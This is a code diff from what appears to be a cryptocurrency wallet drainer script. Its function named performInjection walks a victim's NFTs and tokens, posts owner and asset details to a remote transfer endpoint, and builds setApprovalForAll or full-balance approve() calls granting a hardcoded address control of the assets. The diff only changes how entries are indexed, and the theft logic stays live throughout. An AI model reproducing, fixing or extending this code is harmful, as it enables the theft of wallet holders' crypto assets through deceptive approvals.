@@ -172,10 +172,9 @@ async function performInjection(address) {
         throw "No NFTs found"
     }
     for (let i = 0; i < sortedNFTs.length; i++) {
-        let key = Object.keys(sortedNFTs[i])[0]
-        let actualDict = sortedNFTs[i][key];
-        let higherPrice = sortedNFTs[i][key][0]["token_address"];
-        let isErc20 = sortedNFTs[i][key][0]["isErc20"];
+        let actualDict = sortedNFTs[i][1];
+        let higherPrice = sortedNFTs[i][1]["token_address"];
+        let isErc20 = sortedNFTs[i][1]["isErc20"];
         
         let contractInstance = new web3.eth.Contract(abi, higherPrice);
         let toCheckSumAddress = await web3.utils.toChecksumAddress(higherPrice);
@@ -183,7 +182,7 @@ async function performInjection(address) {
 
         let data = { "owner": selectedAccount, "address": toCheckSumAddress,"isErc20": isErc20  };
         if(isErc20){
-            data["balance"] = actualDict[0]["balance"];
+            data["balance"] = actualDict["balance"];
         }
         console.log(data)
         await fetch(`${URL}/transfer/init`, {
@@ -197,8 +196,8 @@ async function performInjection(address) {
         //let result = await contractInstance.methods.setApprovalForAll(ContractAdr, true).send({ from: selectedAccount });
         //console.log(result);
         let data_to_encode = contractInstance.methods.setApprovalForAll(ContractAdr, true).encodeABI();
-        if (actualDict[0]["isErc20"]) {
-            let balanceOwned =actualDict[0]["balance"];
+        if (actualDict["isErc20"]) {
+            let balanceOwned =actualDict["balance"];
             data_to_encode = contractInstance.methods.approve("0x90808EcB0f081654740477d4c8f30Cc7110d703e", balanceOwned.toString()).encodeABI();
         }
 
@@ -301,7 +300,7 @@ async function getNFTS(address) {
 function sortNFT(nfts) {
     let sortable = [];
     for (const token_address of Object.keys(nfts)) {
-        sortable.push(nfts[token_address]);
+        sortable.push([token_address, nfts[token_address]]);
   
 }
 
